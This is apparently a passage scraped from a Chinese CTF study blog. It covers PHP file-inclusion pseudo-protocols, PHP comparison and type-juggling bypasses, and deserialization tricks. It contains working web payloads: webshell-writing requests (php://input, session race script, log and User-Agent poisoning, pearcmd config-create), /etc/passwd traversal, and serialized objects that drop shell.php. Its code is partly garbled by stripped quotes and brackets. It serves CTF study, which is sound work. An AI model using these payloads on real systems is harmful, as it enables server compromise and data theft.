#用于临时存储数据的内存流。它可以用于在没有创建实际文件的情况下处理临时数据。php://memory #用于在内存中创建可读写的数据流。php://filter #这个伪协议用于数据过滤和转换。它允许您将不同的过滤器应用于数据流，例如Base64编码、压缩和加密等。php://globals #用于访问全局变量。可以通过此伪协议查看和修改PHP全局变量的值。php://fd #用于访问文件描述符。它允许您在PHP中访问底层文件系统。 在CTF中经常使用的是**php://filter和php://input**、php://filter用于读取源码，php://input用于执行POST参数中的php代码 条件 allow_url_fopen:off/on allow_url_include :仅php://input 、php://stdin、php://memory、php://temp 需要on php://input 条件 allow_url_fopen:off/on allow_url_include :on GET[URL部分]?file=php://inputPOST[POST DATA部分]? phpinfo();? 作用 主要用来接收post数据 CTF中文件包含题目里，可以使用php://input协议，将post请求中的数据作为php代码执行 php://filter 条件 allow_url_fopen:off/on allow_url_include :off/on 作用 可以作为一个位于原始数据流和最终目标之间的中间流来处理其他流，负责对数据进行处理（即读取或写入数据之前对其进行修改或过滤） 名称 描述 resource=要过滤的数据流 这个参数是必须的。它指定了你要筛选过滤的数据流。（加绝对路径） read=读链的筛选列表 read参数指定 一个或多个过滤器 用于读操作，可以设定一个或多个过滤器名称，以管道符分隔。（读取文件后编码输出） write=写链的筛选列表 write参数指定 一个或多个过滤器 用于写操作，可以设定一个或多个过滤器名称，以管道符分隔。（编码重写入文件） ；两个链的筛选列表 任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链。 注： read 和 write 指令是互斥的，不能同时使用。 如果存在多个过滤器，字符串从左到右的顺序经过过滤器 常用过滤语句 ?file=php://filter/read=convert.base64-encode/resource=/flag //读取根目录flag文件，进行base64编码 常用过滤器(未完) 字符串过滤器 PHP: 字符串过滤器 - Manual string.rot13（对字符串执行ROT13编码转换） string.toupper（将字符串转化为大写） string.tolower（将字符串转化为小写） string.strip_tags(自 PHP 7.3.0 起废弃，从字符串中去除 HTML 和 PHP 标记) 转换过滤器 PHP: 转换过滤器 - Manual 注：转换过滤器是 PHP 5.0.0 添加的 常用：convert.base64-encode和convert.base64-decode（将字符串进行base64编码加解密） convert.quoted-printable-encode 和 convert.quoted-printable-decode（将字符串进行Quoted-printable编码加解密） convert.iconv.*（将字符串进行字符编码转化） Quoted-Printable（QP）编码 是一种 可读性较高的7位编码，用于安全传输包含 特殊字符（如非 ASCII 字符）的文本，尤其是在 电子邮件（MIME） 中。它的主要目的是在 兼容 7-bit 传输协议（如 SMTP）的同时，保持尽可能的可读性 编码规则： ASCII 可打印字符（33-126） 直接保留，如 abcXYZ123 空格和制表符（TAB） 末尾空格必须用 =20 表示（防止邮件客户端自动去掉） 不可打印字符（0-31, 127-255），使用 =XX 形式编码，其中 XX 是 两位十六进制表示 换行符（CRLF, \\r ） QP 默认使用 \\r 作为换行符 长于 76 个字符 的行必须 换行，并在行尾加 = 作为软换行 phar:// 利用条件 php版本大于等于php5.3.0 allow_url_fopen = On allow_url_include = On 原理 phar:// 是用来解压的伪协议 phar://不管参数中是什么拓展名，都会被当做压缩包 用法 ?file=phar://压缩包/压缩文件 示例 phar://xxx.png/shell.php 写一个木马文件shell.php，然后用zip://伪协议压缩成shell.zip，最后修改后缀名为.png，上传图片 输入测试：http://www.abc.com/xxx/file.php?file=phar://shell.png/shell.php 这样phar://就会将png当做zip压缩包进行解压，并且访问解压后的shell.php文件 zip:// 利用条件 php版本大于等于php5.3.0 allow_url_fopen = On allow_url_include = On 和phar://伪协议原理类似，但用法不同 用法 ?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] 注意：需要将#转换成URL编码：%23 zip:// bzip2:// zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg、png、gif等等。 注：zlib:// 需要是服务器内的压缩包文件、但不局限于后缀名 示例 1.zip://[压缩文件绝对路径]#[压缩文件内的子文件名] 压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传目录/var/www/html/，以file为文件包含的参数为例： ?file=zip:///var/www/html/phpinfo.jpg#phpinfo.txt 2.compress.bzip2://file.bz2 压缩 phpinfo.txt 为 phpinfo.bz2 并上传(同样支持任意后缀名)，并上传目录/var/www/html/，以file为文件包含的参数为例： ?file=compress.bzip2:///var/www/html/phpinfo.bz2 3.compress.zlib://file.gz 压缩 phpinfo.txt 为 phpinfo.gz 并上传(同样支持任意后缀名)，并上传目录/var/www/html/，以file为文件包含的参数为例： ?file=compress.zlib:///var/www/html/phpinfo.gz data:// 条件 php版本大于等于php5.2 allow_url_fopen = On allow_url_include = On 用法 data://text/plain,[加上所需传输的经过url编码数据] http://127.0.0.1/include.php?file=data://text/plain,?php%20phpinfo();? data://text/plain;base64,[加上所需传输的经过base64编码再经过url编码的数据] http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 注：加号 + 的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8%2b的base64解码为： ?php phpinfo();? expect:// PHP要安装expect扩展 http://example.com/index.php?file=php:expect://idhttp://example.com/index.php?file=php:expect://ls 包含session Session文件包含漏洞-简书 利用条件 session文件路径已知，且其中内容部分可控 过滤了点之后不能使用文件包含来getshell了，能利用无后缀的文件session，利用session.upload_progress来进行文件包含，利用PHP_SESSION_UPLOAD_PROGRESS参数 基础知识 一些配置选项 该功能是在php5.4添加的，首先先了解下php.ini以下的几个默认选项 session.upload_progress.enable = onsession.upload_progress.cleanup = onsession.upload_progress.prefix = upload_progress_session.upload_progress.name = PHP_SESSION_UPLOAD_PROGRESS enable = on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ； cleanup = on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；cleanup选项决定了我们需要条件竞争 name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控； prefix+name将表示为session中的键名; session.auto_start：默认为off，若为on，php会在接收请求的时候会自动初始化Session，不再需要执行session_start() session.use_strict_mode：默认值为0，此时用户可以自定义Sesssion ID（默认情况下，PHP允许**任何客户端使用 PHPSESSID 发送请求并恢复会话，**如果攻击者提前猜测或设置了PHPSESSID，则可能劫持用户的会话），比如，我们在Cookie里设置PHPSESSID=ROIS，PHP将会在服务器上创建一个文件/tmp/sess_ROIS。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里 注：由于cleanup=on，会导致文件上传后，session文件的内容立即清空。此时我们得利用条件竞争，在session文件的内容被清空前进行文件包含 常见的php-session存放位置 /var/lib/php/sess_PHPSESSID /var/lib/php/sessions/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID 利用 python脚本 import ioimport sysimport requestsimport threadingsessid = Qftmdef POST(session): while True: f = io.BytesIO(ba * 1024 * 50) session.post( http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/, data=PHP_SESSION_UPLOAD_PROGRESS:?php system(cat *);fputs(fopen(shell.php,w),?php @eval($_POST[mtfQ])?);?, files=file:(q.txt, f), cookies=PHPSESSID:sessid )def READ(session): while True: response = session.get(fhttp://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/?file=/tmp/sess_sessid) if flag not in response.text: print([+++]retry) else: print(response.text) sys.exit(0)with requests.session() as session: t1 = threading.Thread(target=POST, args=(session, )) t1.daemon = True t1.start() READ(session) 包含日志 访问日志 利用条件 需要知道服务器日志的存储路径，且日志文件可读 日志位置 nginx：/var/log/nginx/access.log apache：/var/log/apache2/access_log(access.log) 注：在CTF中，log的地址常被修改掉，可以通过读取相应的配置文件后，再进行包含 payload插入 位置：User-Agent头，GET参数 User-Agent头不需要抓包解码，GET参数需要。 最后getshell即可 SSH log SSH（Secure Shell）是一种加密协议，主要用于远程安全登录和服务器管理 利用条件 需要知道ssh-log的位置，且可读。默认情况下为/var/log/auth.log ubuntu中：ssh '?php phpinfo(); ?'@remotehost 之后会提示输入密码等等，随便输入。 然后在remotehost的ssh-log中即可写入php代码 包含environ（环境变量） 利用条件 php以cgi方式运行，这样environ才会保持UA头。 environ文件存储位置已知，且environ文件可读。 利用 如果一个 Web 服务器有 LFI（本地文件包含）漏洞，但 php://filter、log poisoning 都不可用，那么 /proc/self/environ 可能是最后的希望 如果目标服务器运行 PHP，并且 $_SERVER['HTTP_USER_AGENT'] 被写入环境变量，可以尝试在 User-Agent 头中注入恶意代码： GET /?file=/proc/self/environ HTTP/1.1Host: target.comUser-Agent: ?php system($_GET[cmd]); ? 然后访问http://target.com/?file=/proc/self/environcmd=whoami 包含fd 跟包含environ类似 包含临时文件 同样要竞争 包含上传文件 配合文件上传漏洞，基本原理不变 包含pearcmd pearcmd.php 是 PHP PEAR（PHP Extension and Application Repository） 的命令行管理工具，如果服务器存在 本地文件包含（LFI）漏洞，可以通过包含 pearcmd.php 并传参来执行任意 PHP 代码，从而实现 远程命令执行（RCE） pearcmd.php 可能的路径 Linux /usr/share/php/pearcmd.php/usr/local/lib/php/pearcmd.php/var/www/html/pear/pearcmd.php Windows（XAMPP） C:\\xampp\\php\\PEAR\\pearcmd.php 利用 直接包含 pearcmd.php 进行 RCE 如果服务器有 LFI 漏洞，可以直接访问： http://target.com/index.php?file=/usr/share/php/pearcmd.php 然后使用 +config-create+ 写入 Webshell： http://target.com/index.php?file=/usr/share/php/pearcmd.php+config-create+/var/www/html+?=system($_GET[cmd]);?+.php 这将在 /var/www/html/.php 生成 Webshell，然后访问： http://target.com/.php?cmd=id 即可执行系统命令 结合 php://input 进行代码执行 如果服务器 allow_url_include=On，可以： http://target.com/index.php?file=php://input 然后用 POST 发送： ?php system(id); ? 如果 pearcmd.php 存在，也可以利用： http://target.com/index.php?file=/usr/share/php/pearcmd.php+config-show 这样 pearcmd.php 可能会解析 session 或 临时文件，执行恶意代码 结合 session.auto_start 进行代码执行 如果 session.auto_start=1，可以将恶意代码写入 $_SESSION，然后通过 pearcmd.php 解析： ?phpsession_start();$_SESSION[payload] = ?php system(id); ?;? 然后访问： http://target.com/index.php?file=/usr/share/php/pearcmd.php+config-show 可能会解析 $_SESSION 并执行 payload 代码 绕过姿势 指定前缀 目录遍历 ../可以进行目录遍历 编码绕过 有时把点号过滤了，尝试编码点号 指定后缀 URL URL格式在此处具有妙用，可以在payload最后加**?或者#（url编码为%23），或者空格绕过%20** 使用协议 phar://和zip://都可以 长度截断 利用条件： php版本 php 5.2.8 目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复./ 则后缀/test/test.php，在达到最大值后会被直接丢弃掉 import requests# 目标 URLurl = http://target.com/index.php?file=# 目标文件payload = ../../../../../../etc/passwd# 生成超长路径（超过服务器限制）long_truncation = payload + A * 4000 # 让路径超长# 发送请求response = requests.get(url + long_truncation)# 检查是否成功if root: in response.text: print([+] 成功绕过，已读取 /etc/passwd) print(response.text)else: print([-] 失败，可能需要调整长度) /etc/passwd 文件包含 root: 关键字，如果返回 root:x:0:0: 说明读取成功 0字节截断 利用条件： php版本 php 5.3.4 index.php?file=phpinfo.txt%00 指定前后缀 ?php $file = $_GET[file]; include /var/www/html/.$file./test/test.php;? 可以使用目录遍历和长度截断（或者0字节截断），有必要的话可以对点号编码，至少协议和URL使用不了 防御方案 在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败 open_basedir 的主要作用是限制 PHP 脚本只能访问指定的目录及其子目录。这样，即使某个脚本存在漏洞，也无法访问超出这些限定目录之外的文件 做好文件的权限管理 对危险字符进行过滤等等","tags":["漏洞","PHP","文件包含"],"categories":["PHP","漏洞"]},{"title":"PHP特性总结","path":"/2025/07/09/PHP特性总结/","content":"PHP特性总结 数组绕过正则表达式 if(preg_match(/[0-9]/, $num)) die(no no no!);else(intval($num)) echo $flag; preg_match(/[0-9]/, $num) 作用：检查 $num 是否包含 数字 0-9 如果包含，就 die(no no no!); 终止程序 如果不包含，执行 elseif (intval($num)) intval($num) 作用：尝试将 $num 转换为整数 如果转换结果为真（非 0），就输出 $flag 如果转换结果为 0，则不输出 $flag preg_match第二个参数要求是字符串，如果传入数组则不会进入if语句 payload: num[]=1 [!IMPORTANT] num[]=1绕过原理分析 绕过 preg_match() 当你传递 num[]=1 作为参数时，$num 变成了一个包含单个元素的数组：array(1)。 preg_match(/[0-9]/, $num) 试图在数组中查找数字，然而 preg_match() 只接受字符串类型作为参数，因此它会触发一个警告并返回 false。由于警告不会阻止代码继续执行，preg_match() 不会成功匹配数字，导致代码继续进入 elseif 分支。 触发 intval($num) 对于 intval($num)，如果 $num 是一个 非空数组（比如 array(1)），PHP 会将其转化为 1，因此条件 intval($num) 会成立，进入 elseif 分支并触发 echo $flag。 intval函数的使用 if($num===4476) die(no no no!);if(intval($num,0)===4476) echo $flag;else echo intval($num,0); intval( mixed $value, int $base = 10) : int 当 base 参数的值为 0 时，intval() 会根据输入字符串的 前缀 自动推断进制 如果字符串以 0x 或 0X 开头，则该字符串会被视为 十六进制 数字 如果字符串以 0 开头，则该字符串会被视为 八进制 数字 其他情况，则会将该字符串视为 十进制 数字 用科学计数法绕过 intval(4476.0)===4476 小数点intval(+4476.0)===4476 正负号intval(4476e0)===4476 科学计数法intval(0x117c)===4476 16进制intval(010574)===4476 8进制intval( 010574)===4476 8进制+空格 payload: num=4476.0 正则表达式修饰符 if(preg_match(/^php$/im, $a)) if(preg_match(/^php$/i, $a)) echo hacker; else echo $flag; else echo nonononono; i（不区分大小写）：意味着 php、PHP、PhP 都能匹配。 m（多行模式）： ^ 代表 每一行 的开头，而不是整个字符串的开头。 $ 代表 每一行 的结尾，而不是整个字符串的结尾。 如果 $a 满足第一个条件 /^php$/im（不区分大小写且支持多行匹配），就进入内部的判断。 如果 $a 仅等于 php（不区分大小写），则输出 hacker。 如果 $a 满足第一个正则表达式，但不完全等于 php，则输出 $flag。 如果 $a 没有匹配第一个条件 /^php$/im，则输出 nonononono。 payload: %0aphp 或 php%0aphp highlight_file路径 if($_GET[u]==flag.php) die(no no no);else highlight_file($_GET[u]); if语句只比对字符串，highlight_file可以写路径，故payload有多种解法： ?u=php://filter/read=convert.base64-encode/resource=flag.php php伪协议?u=/var/www/html/flag.php 绝对路径?u=./flag.php 相对路径 md5比较缺陷 if ($_POST[a] != $_POST[b]) if (md5($_POST[a]) === md5($_POST[b])) echo $flag; else print Wrong.; 我们需要找到两个 不相等的值，但它们的 md5() 计算结果相同，即 MD5 碰撞 md5弱比较 不同数据强相等（===） 未使用强制类型转化 MD5无法处理数组，如果传入数组则返回NULL，两个NULL是强相等的 payload: a[]=1b[]=2 不同数据弱相等（==） payload: a=QNKCDZOb=240610708 科学记数法绕过 0e 开头的字符串会被 PHP 识别为 科学记数法，并转换为数字 0，只需找两个md5后都为0e开头且0e 后面均为数字的值即可 payload：a=0e215962017b=0e0 md5强碰撞 $a = (string)$a;$b = (string)$b;if( ($a !== $b) (md5($a) === md5($b)) ) echo $flag; 这里的条件要求 $a 和 $b 必须 不相等，但它们的 MD5 哈希值相同 a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 sha1比较缺陷 if($a==$b) if(sha1($a)==sha1($b)) echo $flag; sha1无法处理数组，如上可使用a[]=1b[]=1数组绕过 如果强制类型转换，则不接受数组，找真正的编码后相同的 aaroZmOkaaK1STfYaaO8zKZFaa3OFF9m 三目运算符的理解+变量覆盖 $_GET?$_GET=$_POST:flag;$_GET[flag]==flag?$_GET=$_COOKIE:flag;$_GET[flag]==flag?$_GET=$_SERVER:flag;highlight_file($_GET[HTTP_FLAG]==flag?$flag:__FILE__); $_GET ? $_GET = $_POST : flag; 果 $_GET 数组不为空，则将 $_GET 的引用赋值给 $_POST即$_GET 和 $_POST 会指向相同的数据 $_GET[flag] == flag ? $_GET = $_COOKIE : flag; 如果 $_GET['flag'] 的值为 'flag'，则将 $_GET 数组的引用赋值给 $_COOKIE即$_GET 和 $_COOKIE 将指向相同的数据 $_GET[flag] == flag ? $_GET = $_SERVER : flag; 如果 $_GET['flag'] 的值为 'flag'，则将 $_GET 数组的引用赋值给 $_SERVER。这使得 $_GET 和 $_SERVER 指向相同的数据 highlight_file($_GET[HTTP_FLAG] == flag ? $flag : __FILE__); 该行会高亮显示文件内容，条件是 $_GET['HTTP_FLAG'] 等于 'flag'。如果条件为真，它会显示 $flag 变量的内容；否则，它会显示当前脚本文件的内容 payload:GET 请求: 1=1POST 请求: HTTP_FLAG=flag php弱类型比较 $allow = array();for ($i=36; $i 0x36d; $i++) array_push($allow, rand(1,$i));if(isset($_GET[n]) in_array($_GET[n], $allow)) file_put_contents($_GET[n], $_POST[content]); payload:GET 请求: ?n=1.php //1可替换成其他数字进行尝试POST 请求: content=?php system($_GET[cmd]); ? 如： 假设我们找到了合法的 $_GET['n']=123，我们可以上传 Webshell： POST /vuln.php?n=123 HTTP/1.1Host: target.comContent-Type: application/x-www-form-urlencodedcontent=?php system($_GET[cmd]); ? 然后访问： http://target.com/123?cmd=whoami and与的区别 $a = false true;$b = false and true;var_dump($a); // 输出: falsevar_dump($b); // 输出: true false true 先计算 false true（结果是 false），然后赋值给 $a。 false and true 先执行 $b = false，然后 true 没有影响。 PHP双（（（$）的变量覆盖 在双写$的时候，属于动态变量，就是后面的变量值作为新的变量名 $test=a23; $test等于a23$$test=456; $$test也就等于$a23,这里相当于给$a23赋值了echo $test; 正常输出$test为a23echo $$test; 这里输出$$test，就是$a23，为456 parse_str函数的使用 parse_str会把字符串解析为变量，大部分是传入的多个值 $a=q=123p=456;parse_str($a);echo $q; 输出123echo $p; 输出456parse_str($a,$b); 第二个参数作为数组，解析的变量都存入这个数组中echo $b[q]; 输出123echo $b[p]; 输出456 trim函数的绕过+is_numeric绕过 trim() 函数用于去除字符串两端的空白字符（包括空格、制表符、换行符等） trim默认时没有剔除%0c（换页符） if(is_numeric($num) and $num!==36 and trim($num)!==36) if($num==36) echo $flag; else echo hacker!!; payload: num=%0c36 绕过死亡die function filter($x) if(preg_match(/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i,$ x)) die(too young too simple sometimes naive!); $file=$_GET[file];$contents=$_POST[contents];filter($file);file_put_contents($file, ?php die();?.$contents); payload:file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phppost:contents=?hp pvela$(P_SO[T]1;)? 这会将字符两位两位交换，file_put_contents在写入的时候会破坏那句die，但contents那句恢复原貌， 可以执行 gettext拓展的使用 var_dump(call_user_func($f1,$f2)); 如以上代码，多重过滤后，f1可以为 gettext ，f2可以为 phpinfo ，如果过滤更为严格，更改ini文件里 的拓展后， _() 等效于 gettext() ?phpecho gettext(phpinfo);结果 phpinfoecho _(phpinfo);结果 phpinfo php特性总结","tags":["漏洞","PHP"],"categories":["PHP","漏洞"]},{"title":"PHP反序列化","path":"/2025/07/09/PHP反序列化/","content":"PHP反序列化 序列化和反序列化 序列化 利用serialize()函数将一个对象转换为字符串形式 序列化后的字符串的格式 每一个序列化后的小段都由; 隔开, 使用表示层级关系 数据类型 提示符 格式 字符串 s s:长度:“内容” 已转义字符串 S s:长度:“转义后的内容” 整数 i i:数值 布尔值 b b:1 = true / b:0 = false 空值 N N; 数组 a a:大小:{键序列段;值序列段;重复多次} 对象/类 O O:类型名长度:“类型名称”:成员数:{成员名称序列段;成员值序列段:} 引用 R R:反序列化变量的序号, 从1开始 关于非公有字段名称: private：用私有的类的名称 (考虑到继承的情况) 和字段名组合 %00类名%00成员名（%00占一个字节长度） protected：用 * 和字段名组合 %00*%00成员名 注：注意这两个%00就是 ascii 码为0 的字符，为不可见字符，但是url编码后就可以看见。我们可以将序列化的字符用urlencode编码之后,打印出来查看 示例 如果是直接输出对象： ?php class test public $name=ikkunma; public $age=18; $a=new test(); print_r($a);? 输出： test Object ( [name] = ikkunma [age] = 18 ) 如果利用serialize()函数将这个对象进行序列化成字符串然后输出： ?php class test public $name=ikkunma; private $age=18; protected $sex=man; $a=new test(); $a=serialize($a); print_r($a);? 输出： O:4:test:3:s:4:name;s:7:ikkunma;s:9:testage;s:2:18;s:6:*sex;s:3:man; O 表示对象 4 说明对象名长度是4个字符 test 说明这个对象名是test 3 说明这个对象成员个数为3 个 ... 包含对象的所有属性 反序列化 利用unserailize()函数将一个经过序列化的字符串还原成php代码形式 ?php $b=序列化字符串; $b=unserialize($b);? 作用 序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等 PHP反序列化漏洞原理 CTF 里常考的反序列化漏洞，重点就是找合适的类，利用魔术方法触发漏洞 PHP常见魔术方法 详细讲解魔术方法的用法 __construct 构造函数,会在每次创建新对象时先调用此方法 __destruct 析构函数,会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行 __toString 当一个对象被当作一个字符串被调用。 __wakeup() 使用unserialize时触发 __sleep() 使用serialize时触发，返回一个包含对象中所有应被序列化的变量名称的数组 __call() 在对象中调用一个不可访问方法时自动调用 __callStatic() 用静态方式中调用一个不可访问方法时调用 __get() 用于从不可访问的属性读取数据 __set() 在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用 __isset() 在不可访问的属性上调用isset()或empty()触发 __unset() 在不可访问的属性上使用unset()时触发 __toString() 把类当作字符串使用时触发,返回值需要为字符串 __invoke() 当脚本尝试将对象调用为函数时触发，该对象必须是直接拥有__invoke()魔术方法的对象 我这边只讲5个魔术方法： __construct()当一个对象创建时被调用__destruct()当一个对象销毁时被调用__toString()当反序列化后的对象被输出的时候(转化为字符串的时候)被调用__sleep()执行serialize()时，先会调用这个函数__wakeup()执行unserialize()时，先会调用这个函数 使用实例： ?php class test public $a=hacked by ikkunma; public $b=hacked by ikkunmma; public function pt() echo $this-a.br/; public function __construct() echo __constructbr/; public function __destruct() echo __constructbr/; public function __sleep() echo __sleepbr/; return array(a,b); public function __wakeup() echo __wakeupbr/; //创建对象调用__construct $object = new test(); //序列化对象调用__sleep $serialize = serialize($object); //输出序列化后的字符串 echo serialize: .$serialize.br/; //反序列化对象调用__wakeup $unserialize=unserialize($serialize); //调用pt输出数据 $unserialize-pt(); //脚本结束调用__destruct? 输出： __construct__sleepserialize: O:4:test:2:s:1:a;s:17:hacked by ikkunma;s:1:b;s:18:hacked by ikkunmma;__wakeup__hacked by ikkunma__construct__construct 原来有一个实例化出的对象，然后又反序列化出了一个对象，就存在两个对象，所以最后销毁了两个对象也就出现了执行了两次__destruct 例题 一 源码： ?phperror_reporting(0);include flag.php;$KEY = ikkunma;$str = $_GET[str];if (unserialize($str) === $KEY) echo $flag;show_source(__FILE__); 我们输入的一个变量反序列化后的值等于ikkunma ?php $a=ikkunma; $b=serialize($a); echo $b;? 序列化得到： s:7:ikkunma; 将序列化后的内容传入url得到flag ?str=s:7:ikkunma; 二 源码： class foo public $file = 2.txt; // 控制写入的文件名 public $data = test; // 控制写入的内容 function __destruct() // 在对象销毁时写入文件 file_put_contents(dirname(__FILE__)./.$this-file, $this-data); $file_name = $_GET[filename]; // 获取用户传入的文件名print You have readfile .$file_name;// 读取用户指定的文件，并进行 unserializeunserialize(file_get_contents($file_name)); 这串代码的意思是将读取的文件内容进行反序列化，__destruct函数里面是生成文件，如果我们本地存在一个文件名是flag.txt，里面的内容是 O:3:foo:2:s:4:file;s:9:shell.php;s:4:data;s:31:?php system($_GET[cmd]); ?; 将它进行反序列化就会生成shell.php里面的内容为?php system($_GET['cmd']); ? 构造payload：?filename=flag.txt 各种绕过姿势 绕过__wakeup(CVE-2016-7124) __wakeup()魔术方法在执行unserialize()时，会优先调用这个函数，而不会执行__construct() 函数 条件 PHP55.6.25 PHP7 7.0.10 绕过 序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 实例 源码： ?phpclass test public $a; public function __construct() $this-a = abc; public function __wakeup() $this-a=def; public function __destruct() echo $this-a; 其序列化后为 O:4:test:1:s:1:a;s:3:abc; 执行反序列化 unserialize('O:4:test:1:s:1:a;s:3:abc;');，得到结果为 def ，说明优先执行了 __wakeup() 此时我们要绕过 __wakeup()：把对象的属性个数改大 O:4:test:666:s:1:a;s:3:abc; 执行反序列化 unserialize('O:4:test:666:s:1:a;s:3:abc;'); 得到结果为 abc , 发现并没有执行 __wakeup()，绕过成功 绕过__destruct() __destruct是PHP对象的一个魔术方法，称为析构函数，顾名思义这是当该对象被销毁的时候自动执行的一个函数。其中以下情况会触发__destruct 主动调用unset($obj) 主动调用$obj = NULL 程序自动结束 PHP还拥有垃圾回收Garbage collection即我们常说的GC机制 PHP中GC使用引用计数和回收周期自动管理内存对象，那么这时候当我们的对象变成了“垃圾”，就会被GC机制自动回收掉，回收过程中，就会调用函数的__destruct 当一个对象没有任何引用的时候，则会被视为“垃圾”，如： $a = new test(); //test 对象被变量a引用，所以该对象不是“垃圾”new test(); //test 在没有被引用时便会被当作“垃圾”进行回收(如果()里有参数则不是垃圾)$a = new test();$a = 1; //test 在失去引用时便会被当作“垃圾”进行回收 实例 源码： ?phpclass test function __destruct() echo success!!; if(isset($_REQUEST[input])) $a = unserialize($_REQUEST[input]); throw new Exception(lose); 这里我们要求输出 success!! ，但执行反序列化后得到的对象有了引用，给了 a 变量，后面程序接着就抛出一个异常，非正常结束，导致未正常完成 GC 机制，即没有执行 __destruct ?input=O:4:test:0: //会抛出一个异常 所以我们要反序列化手动去 “销毁” 创造的对象，这里利用数组来完成 原理： 我们序列化一个数组对象，考虑反序列化本字符串，因为反序列化的过程是顺序执行的，所以到第一个属性时，会将Array[0]设置为对象，同时我们又将Array[0]设置为null，这样前面的test对象便丢失了引用，就会被GC所捕获，就可以执行__destruct了 构造： class test $a = serialize(array(new test, null));echo $a.br/;$a = str_replace(:1, :0, $a);//将序列化的数组下标为0的元素给为nullecho $a; 得到： a:2:i:0;O:4:test:0:i:1;N;a:2:i:0;O:4:test:0:i:0;N;//最终payload 传入： ?input=a:2:i:0;O:4:test:0:i:0;N; //成功得到 success!! 绕过正则 如preg_match('/^O:\\d+/')匹配序列化字符串是否是对象字符串开头 绕过 利用加号绕过（注意在url里传参时+要编码为%2B） 利用数组对象绕过，如 serialize(array($a)); a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构) ?phpclass test public $a; public function __construct() $this-a = abc; public function __destruct() echo $this-a.PHP_EOL; function match($data) if (preg_match(/^O:\\d+/,$data)) die(nonono!); else return $data; $a = O:4:test:1:s:1:a;s:3:abc;;// +号绕过$b = str_replace(O:4,O:+4, $a);unserialize(match($b));// 将对象放入数组绕过 serialize(array($a));unserialize(a:1:i:0;O:4:test:1:s:1:a;s:3:abc;); 字符逃逸 对于字符逃逸, 由于 PHP 序列化后的字符类型中的引号不会被转义, 对于字符串末尾靠提供的字符数量来读取, 对于服务端上将传入的字符串实际长度进行增加或减少(例如替换指定字符到更长/短的字符), 我们就可以将其溢出并我们的恶意字符串反序列化. ?phpclass Book public $id = 114514; public $name = Ikkunmaa 的学习笔记; // 可控 public $path = Ikkunmaa 的学习笔记.md;function filter($str) return str_replace(, \\\\, $str);$exampleBook = new Book();echo [处理前] ;$ser = serialize($exampleBook);echo $ser . ;echo [处理后] ;$ser = filter($ser);echo $ser . ;echo [文件路径] ;$exampleBook = unserialize($ser);echo $exampleBook-path . ; 序列化为 O:4:Book:3:s:2:id;i:114514;s:4:name;s:25:Ikkunmaa 的学习笔记;s:4:path;s:27:Ikkunmaa 的学习笔记.md; 此代码会将其中的单引号 ' 过滤成为\\'（长度增加 1） 我们可以构造带 ' 的 name，使 name 的实际长度比 s:25 预期的长 反序列化时，PHP仍按照 s:25 读取，但 name 变长后，会溢出到 path，从而控制 path 的值 构造payload： O:4:Book:3:s:2:id;i:114514;s:4:name;s:25:AAAAAAAAAAAAAAAAAAAAAAAAA;s:4:path;s:8:flag.php; 通过post提交： POST /vuln.php HTTP/1.1Host: target.comContent-Type: application/x-www-form-urlencodeddata=O:4:Book:3:s:2:id;i:114514;s:4:name;s:25:AAAAAAAAAAAAAAAAAAAAAAAAA;s:4:path;s:8:flag.php; 利用引用绕过 PHP 中的引用 () 是一种特殊的机制，它使得变量指向同一个内存地址 反序列化的过程中，可以利用引用来将多个变量指向同一个对象，从而修改对象的某些属性或操作对象的行为 实例 源码： ?phpclass test public $a; public $b; public function __construct() $this-a = aaa; public function __destruct() if($this-a === $this-b) echo you success; if(isset($_REQUEST[input])) if(preg_match(/aaa/, $_REQUEST[input])) die(nonono); unserialize($_REQUEST[input]);else highlight_file(__FILE__); 要求输出 you success，但构造的序列化字符串中不能由 aaa 我们可以利用引用绕过 ?input=O:4:test:2:s:1:a;s:3:aaa;s:1:b;R:1; 16进制绕过字符的过滤 序列字符串中表示字符类型的s大写时，会被当成16进制解析 ?phpclass Read public $name; public function __wakeup() if ($this-name == flag) echo You did it!; $str = ;if (strpos($str, flag) === false) $obj = unserialize($str);else echo You cant do it!; 这里检测了是否包含 flag 字符, 我们可以尝试使用 flag 的十六进制 \\66\\6c\\61\\67 来绕过, 构造以下: O:4:Read:1:s:4:name;S:4:\\66\\6c\\61\\67; POP链构造 POP（Property-Oriented Programming）是一种基于对象属性的编程技术，通常用于PHP 反序列化漏洞的利用 当 PHP 代码使用 